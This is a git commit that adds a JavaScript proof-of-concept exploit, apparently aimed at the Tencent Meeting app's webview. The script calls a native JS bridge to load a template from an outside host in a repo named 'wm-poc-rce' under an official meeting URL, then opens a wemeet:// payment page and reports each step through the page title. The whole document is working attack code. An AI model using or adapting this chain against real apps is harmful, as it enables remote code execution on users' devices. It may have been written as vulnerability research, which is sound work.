949d92598c97aefb03301afb4e411546048df01d
whs <whs@local>
2026-09-06 05:39:09 -0400

    p127 leftover UpdateTemplate then MAIN Pay official no LoadUrl

---
+++ p127pay.js
@@ -0,0 +1,49 @@
+(function(){
+  document.title='P127TB:'+location.host;
+  window.__p=function(r){
+    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+    document.title='P127CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
+  };
+  function c(id,mod,m,p){
+    try{
+      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+        callback:'window.__p',module:mod,method:m,param:p,callId:id
+      }));
+    }catch(e){
+      document.title='P127TB-NOJS:'+location.host;
+    }
+  }
+  if(!window.JSCallJavaMgr){document.title='P127TB-NOMGR:'+location.host;return}
+  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+  var tpl='https://gitwhs.github.io/wm-poc-rce/p126tpl.html';
+  var sch='wemeet://page/pay/main_process_webview';
+  var q=[
+    ['H2','CommonPlugin','GetPerformance',{}],
+    ['LT','CommonPlugin','LoadTemplateWebView',{
+      url:official,
+      template_url:tpl,
+      template_id:'p126',
+      process_pattern:0,
+      from_webView:true
+    }],
+    ['UP','CommonPlugin','UpdateTemplatePreloadDataCache',{
+      url:official,
+      template_url:tpl,
+      template_id:'p126',
+      process_pattern:0
+    }],
+    ['OP','CommonPlugin','OpenNewPage',{
+      scheme:sch,
+      router_params:{url:official}
+    }]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P127TB-DONE:'+location.host;return}
+    var x=q[i++];
+    document.title='P127-RUN:'+x[0];
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n, 4000);
+  }
+  setTimeout(n, 800);
+})();
